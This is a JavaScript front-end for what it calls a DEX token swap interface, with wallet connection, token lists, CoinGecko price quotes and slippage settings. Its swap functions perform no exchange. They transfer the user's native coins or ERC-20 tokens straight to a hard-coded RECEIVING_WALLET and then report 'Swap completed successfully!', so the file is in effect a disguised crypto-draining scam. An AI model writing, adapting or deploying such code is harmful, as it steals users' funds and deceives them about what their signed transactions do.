// app.js - Enhanced DEX Token Swap Interface

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const GAS_PRICE_API = "https://api.etherscan.io/api?module=gastracker&action=gasoracle";
const MAX_SLIPPAGE = 50; // 50% maximum slippage
const MIN_SLIPPAGE = 0.1; // 0.1% minimum slippage

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage
let transactionDeadline = 20; // 20 minutes default
let expertMode = false;
let tokenFavorites = JSON.parse(localStorage.getItem('tokenFavorites')) || {};
let recentTokens = JSON.parse(localStorage.getItem('recentTokens')) || {};

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    setupEventListeners();
    
    // Set default tokens (ETH and USDT)
    const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
    const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "USDT");
    
    if (defaultFromToken && defaultToToken) {
      currentFromToken = defaultFromToken;
      currentToToken = defaultToToken;
      updateTokenSelectors();
      addToRecentTokens(defaultFromToken);
      addToRecentTokens(defaultToToken);
    }
    
    // Load saved settings
    loadSavedSettings();
    
    // Check wallet environment
    await checkWalletEnvironment();
    
    // Initialize price updates
    initializePriceUpdates();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

function setupEventListeners() {
  document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
  document.getElementById("swapBtn").addEventListener("click", handleSwap);
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
  document.getElementById("fromAmount").addEventListener("input", debounce(updateToAmount, 500));
  
  // Settings event listeners
  document.querySelectorAll(".dex-slippage-option").forEach(btn => {
    btn.addEventListener("click", () => {
      currentSlippage = parseFloat(btn.dataset.value);
      updateSlippageUI();
      saveSettings();
      updateToAmount();
    });
  });
  
  document.getElementById("slippageTolerance").addEventListener("input", (e) => {
    let value = parseFloat(e.target.value);
    if (isNaN(value)) return;
    
    value = Math.max(MIN_SLIPPAGE, Math.min(value, MAX_SLIPPAGE));
    currentSlippage = value;
    updateSlippageUI();
    saveSettings();
    updateToAmount();
  });
  
  document.getElementById("transactionDeadline").addEventListener("input", (e) => {
    transactionDeadline = parseInt(e.target.value) || 20;
    saveSettings();
  });
  
  document.getElementById("expertMode").addEventListener("change", (e) => {
    expertMode = e.target.checked;
    saveSettings();
  });
  
  // Mobile-specific listeners
  if (isMobile()) {
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  }
}

function loadSavedSettings() {
  const savedSettings = JSON.parse(localStorage.getItem('swapSettings'));
  if (savedSettings) {
    currentSlippage = savedSettings.slippage || 0.5;
    transactionDeadline = savedSettings.deadline || 20;
    expertMode = savedSettings.expertMode || false;
    
    document.getElementById("slippageTolerance").value = currentSlippage;
    document.getElementById("transactionDeadline").value = transactionDeadline;
    document.getElementById("expertMode").checked = expertMode;
    
    updateSlippageUI();
  }
}

function saveSettings() {
  const settings = {
    slippage: currentSlippage,
    deadline: transactionDeadline,
    expertMode: expertMode
  };
  localStorage.setItem('swapSettings', JSON.stringify(settings));
}

function updateSlippageUI() {
  document.querySelectorAll(".dex-slippage-option").forEach(btn => {
    btn.classList.toggle("active", parseFloat(btn.dataset.value) === currentSlippage);
  });
  document.getElementById("slippageTolerance").value = currentSlippage;
}

function addToRecentTokens(token) {
  if (!token || !token.symbol) return;
  
  const network = token.originNetwork || currentNetwork;
  if (!recentTokens[network]) recentTokens[network] = [];
  
  // Remove if already exists
  recentTokens[network] = recentTokens[network].filter(t => 
    t.address !== token.address && t.symbol !== token.symbol
  );
  
  // Add to beginning
  recentTokens[network].unshift({
    symbol: token.symbol,
    address: token.address,
    name: token.name,
    isNative: token.isNative
  });
  
  // Keep only last 5
  if (recentTokens[network].length > 5) {
    recentTokens[network] = recentTokens[network].slice(0, 5);
  }
  
  localStorage.setItem('recentTokens', JSON.stringify(recentTokens));
}

function toggleTokenFavorite(token) {
  if (!token || !token.symbol) return;
  
  const key = `${token.originNetwork || currentNetwork}_${token.address}`;
  tokenFavorites[key] = !tokenFavorites[key];
  localStorage.setItem('tokenFavorites', JSON.stringify(tokenFavorites));
  
  return tokenFavorites[key];
}

function initializePriceUpdates() {
  // Update prices every 30 seconds
  setInterval(async () => {
    if (currentFromToken || currentToToken) {
      await updateToAmount();
    }
  }, 30000);
}

// =====================
// UTILITY FUNCTIONS
// =====================

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function debounce(func, timeout = 300) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => { func.apply(this, args); }, timeout);
  };
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
  }
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  // Check if wallet was previously connected
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  // Detect current network if wallet is connected
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    // Save connection to localStorage
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    
    // Update token balances
    updateTokenBalances();
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

async function updateTokenBalances() {
  if (!userAddress || !currentFromToken) return;
  
  try {
    let balance;
    if (currentFromToken.isNative) {
      balance = await provider.getBalance(userAddress);
    } else {
      const contract = new ethers.Contract(currentFromToken.address, ERC20_ABI, provider);
      balance = await contract.balanceOf(userAddress);
    }
    
    const decimals = currentFromToken.decimals || 18;
    const formattedBalance = ethers.utils.formatUnits(balance, decimals);
    document.getElementById("fromTokenBalance").textContent = 
      `Balance: ${parseFloat(formattedBalance).toFixed(6)}`;
  } catch (err) {
    console.error("Error fetching balance:", err);
    document.getElementById("fromTokenBalance").textContent = "Balance: -";
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    // Disconnect if already connected
    userAddress = null;
    provider = null;
    signer = null;
    localStorage.removeItem('walletConnected');
    updateWalletButton(false);
    updateSwapButton();
    updateStatus("Wallet disconnected", "success");
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    // Request account access
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    // Detect current network
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
    updateTokenBalances();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  currentNetwork = network;
  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
  updateNetworkLogo(network);
  
  // Reset tokens when network changes
  currentFromToken = null;
  currentToToken = null;
  updateTokenSelectors();
  
  if (userAddress) {
    await checkNetwork();
    updateTokenBalances();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  // Clear previous items
  tokenItems.innerHTML = '';
  noTokensFound.style.display = 'none';
  
  // Filter tokens for current network and other networks with same symbol
  let networkTokens = [];
  for (const network in TOKENS) {
    TOKENS[network].forEach(token => {
      // Skip REWARD token
      if (token.symbol === "REWARD") return;
      
      // Add token if it's for current network or has same symbol
      if (network === currentNetwork || 
          TOKENS[currentNetwork].find(t => t.symbol === token.symbol) === undefined) {
        networkTokens.push({
          ...token,
          originNetwork: network
        });
      }
    });
  }
  
  // Sort by priority
  networkTokens.sort((a, b) => a.priority - b.priority);
  
  // Add search functionality
  searchInput.oninput = (e) => {
    const searchTerm = e.target.value.toLowerCase();
    let hasVisibleItems = false;
    const items = document.querySelectorAll('.dex-token-item');
    
    items.forEach(item => {
      const name = item.dataset.name.toLowerCase();
      const symbol = item.dataset.symbol.toLowerCase();
      const address = item.dataset.address.toLowerCase();
      
      if (name.includes(searchTerm) || 
          symbol.includes(searchTerm) || 
          address.includes(searchTerm)) {
        item.style.display = 'flex';
        hasVisibleItems = true;
      } else {
        item.style.display = 'none';
      }
    });
    
    noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
  };
  
  // Add section for favorites if any exist
  const favoriteTokens = networkTokens.filter(token => {
    const key = `${token.originNetwork || currentNetwork}_${token.address}`;
    return tokenFavorites[key];
  });
  
  if (favoriteTokens.length > 0) {
    const favoritesHeader = document.createElement('div');
    favoritesHeader.className = 'dex-token-section-header';
    favoritesHeader.textContent = 'Favorites';
    tokenItems.appendChild(favoritesHeader);
    
    favoriteTokens.forEach(token => {
      addTokenToModal(token, type, tokenItems, true);
    });
  }
  
  // Add section for recent tokens if any exist
  const recentNetworkTokens = recentTokens[currentNetwork] || [];
  if (recentNetworkTokens.length > 0) {
    const recentHeader = document.createElement('div');
    recentHeader.className = 'dex-token-section-header';
    recentHeader.textContent = 'Recently Used';
    tokenItems.appendChild(recentHeader);
    
    recentNetworkTokens.forEach(recentToken => {
      const fullToken = networkTokens.find(t => 
        t.symbol === recentToken.symbol && 
        t.address === recentToken.address
      );
      if (fullToken) {
        addTokenToModal(fullToken, type, tokenItems);
      }
    });
  }
  
  // Add all tokens section
  const allHeader = document.createElement('div');
  allHeader.className = 'dex-token-section-header';
  allHeader.textContent = 'All Tokens';
  tokenItems.appendChild(allHeader);
  
  // Add tokens to list
  if (networkTokens.length === 0) {
    noTokensFound.style.display = 'block';
  } else {
    networkTokens.forEach(token => {
      // Skip if already added as favorite or recent
      const key = `${token.originNetwork || currentNetwork}_${token.address}`;
      if (tokenFavorites[key] || 
          recentNetworkTokens.some(t => t.symbol === token.symbol && t.address === token.address)) {
        return;
      }
      addTokenToModal(token, type, tokenItems);
    });
  }
  
  modal.style.display = 'flex';
  searchInput.value = '';
  searchInput.focus();
}

function addTokenToModal(token, type, container, isFavorite = false) {
  const tokenItem = document.createElement('div');
  tokenItem.className = 'dex-token-item';
  tokenItem.dataset.name = token.name.toLowerCase();
  tokenItem.dataset.symbol = token.symbol.toLowerCase();
  tokenItem.dataset.address = token.address.toLowerCase();
  
  const key = `${token.originNetwork || currentNetwork}_${token.address}`;
  const isFav = isFavorite || tokenFavorites[key];
  
  tokenItem.innerHTML = `
    <img src="https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png" 
         onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
         alt="${token.symbol}">
    <div class="dex-token-info">
      <div class="dex-token-name">${token.name} 
        ${token.originNetwork !== currentNetwork ? 
          `<span class="token-network-badge">${token.originNetwork}</span>` : ''}
      </div>
      <div class="dex-token-symbol">${token.symbol}</div>
    </div>
    <button class="dex-token-favorite ${isFav ? 'active' : ''}">
      <i class="fas fa-star"></i>
    </button>
  `;
  
  tokenItem.addEventListener('click', () => {
    if (type === 'from') {
      currentFromToken = token;
      addToRecentTokens(token);
      updateTokenBalances();
    } else {
      currentToToken = token;
      addToRecentTokens(token);
    }
    updateTokenSelectors();
    hideTokenList();
    updateToAmount();
  });
  
  const favoriteBtn = tokenItem.querySelector('.dex-token-favorite');
  favoriteBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    const isNowFavorite = toggleTokenFavorite(token);
    favoriteBtn.classList.toggle('active', isNowFavorite);
  });
  
  container.appendChild(tokenItem);
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    fromTokenBtn.innerHTML = `
      <img src="https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    toTokenBtn.innerHTML = `
      <img src="https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  updateSwapButton();
}

async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && currentToToken && fromAmount > 0) {
    // Show loading state
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    document.getElementById("priceImpact").textContent = "Loading...";
    
    try {
      const [rate, gasPrice] = await Promise.all([
        getConversionRate(currentFromToken, currentToToken),
        getGasPriceEstimate()
      ]);
      
      const toAmount = fromAmount * rate;
      const priceImpact = calculatePriceImpact(fromAmount, toAmount);
      
      // Update UI
      document.getElementById("toAmount").value = toAmount.toFixed(6);
      document.getElementById("exchangeRate").textContent = 
        `1 ${currentFromToken.symbol} = ${rate.toFixed(6)} ${currentToToken.symbol}`;
      document.getElementById("minReceived").textContent = 
        `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
      
      // Update price impact with color coding
      const priceImpactElement = document.getElementById("priceImpact");
      priceImpactElement.textContent = `${priceImpact.toFixed(2)}%`;
      priceImpactElement.className = "dex-price-impact" + 
        (priceImpact > 3 ? " high" : "") + 
        (priceImpact > 5 ? " very-high" : "");
      
      // Show token prices if available
      const fromPrice = await getTokenPrice(currentFromToken);
      if (fromPrice) {
        document.getElementById("fromTokenPrice").textContent = 
          `$${(fromAmount * fromPrice).toLocaleString('en-US', { 
            minimumFractionDigits: 2, 
            maximumFractionDigits: 2 
          })}`;
      }
      
      // Show gas estimate
      if (gasPrice) {
        document.getElementById("gasEstimate").textContent = 
          `${gasPrice} ${currentNetwork === 'ethereum' ? 'Gwei' : 'Gwei'}`;
      }
      
    } catch (err) {
      console.error("Error updating amounts:", err);
      updateStatus("Error fetching price data", "error");
    }
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
    document.getElementById("priceImpact").textContent = '-';
    document.getElementById("fromTokenPrice").textContent = '';
  }
  
  updateSwapButton();
}

function calculatePriceImpact(fromAmount, toAmount) {
  // Simplified price impact calculation
  // In a real DEX, this would use liquidity pool data
  const baseRate = 0.0005; // Base 0.05% impact
  const amountImpact = fromAmount * 0.0001; // 0.01% per unit
  return (baseRate + amountImpact) * 100; // Convert to percentage
}

async function getGasPriceEstimate() {
  try {
    if (currentNetwork !== 'ethereum') return null;
    
    const response = await fetch(GAS_PRICE_API);
    const data = await response.json();
    return data.result?.ProposeGasPrice || null;
  } catch (err) {
    console.error("Error fetching gas price:", err);
    return null;
  }
}

async function getConversionRate(fromToken, toToken) {
  try {
    // Get prices from CoinGecko
    const [fromPrice, toPrice] = await Promise.all([
      getTokenPrice(fromToken),
      getTokenPrice(toToken)
    ]);
    
    if (fromPrice && toPrice) {
      return fromPrice / toPrice;
    }
  } catch (err) {
    console.error("Error getting conversion rate:", err);
  }
  
  // Fallback to hardcoded rates if API fails
  const rates = {
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
    'BNB-USDT': 300,
    'USDT-BNB': 0.0033,
    'MATIC-USDT': 0.7,
    'USDT-MATIC': 1.42
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || 1;
}

async function getTokenPrice(token) {
  if (!token.address || token.isNative) {
    // Handle native tokens
    const nativeIds = {
      ethereum: 'ethereum',
      bsc: 'binancecoin',
      polygon: 'matic-network'
    };
    
    const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
    const data = await response.json();
    return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
  } else {
    // Handle contract tokens
    const chainMap = {
      ethereum: 'ethereum',
      bsc: 'binance-smart-chain',
      polygon: 'polygon-pos'
    };
    
    try {
      const response = await fetch(`${COINGECKO_API}/coins/${chainMap[token.originNetwork || currentNetwork]}/contract/${token.address}`);
      const data = await response.json();
      return data.market_data?.current_price?.usd;
    } catch (err) {
      console.error(`Error getting price for ${token.symbol}:`, err);
      return null;
    }
  }
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) return;
  
  // Show confirmation modal if not in expert mode and slippage is high
  if (!expertMode && currentSlippage > 3) {
    const confirmed = confirm(`You have set a high slippage tolerance (${currentSlippage}%). Continue anyway?`);
    if (!confirmed) return;
  }
  
  try {
    showLoader();
    updateStatus("Processing swap...", "success");
    
    // First check if we need to switch networks
    await checkNetwork();
    
    if (currentFromToken.isNative) {
      await transferNativeToken(fromAmount);
    } else {
      await transferERC20Token(currentFromToken, fromAmount);
    }
    
    updateStatus("Swap completed successfully!", "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    
    // Update balances after swap
    updateTokenBalances();
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Swap failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

async function transferNativeToken(amount) {
  const tx = await signer.sendTransaction({
    to: RECEIVING_WALLET,
    value: ethers.utils.parseEther(amount.toString()),
    gasLimit: 21000
  });
  
  await tx.wait();
}

async function transferERC20Token(token, amount) {
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const decimals = token.decimals || 18;
  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
  
  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
    gasLimit: 100000
  });
  
  await tx.wait();
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    return;
  }
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) {
    btn.disabled = true;
    btnText.textContent = "Enter Amount";
    return;
  }
  
  btn.disabled = false;
  btnText.textContent = "Swap";
}

function showNetworkOptions() {
  const newNetwork = currentNetwork === "ethereum" ? "bsc" : 
                    currentNetwork === "bsc" ? "polygon" : "ethereum";
  handleNetworkChange(newNetwork);
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}
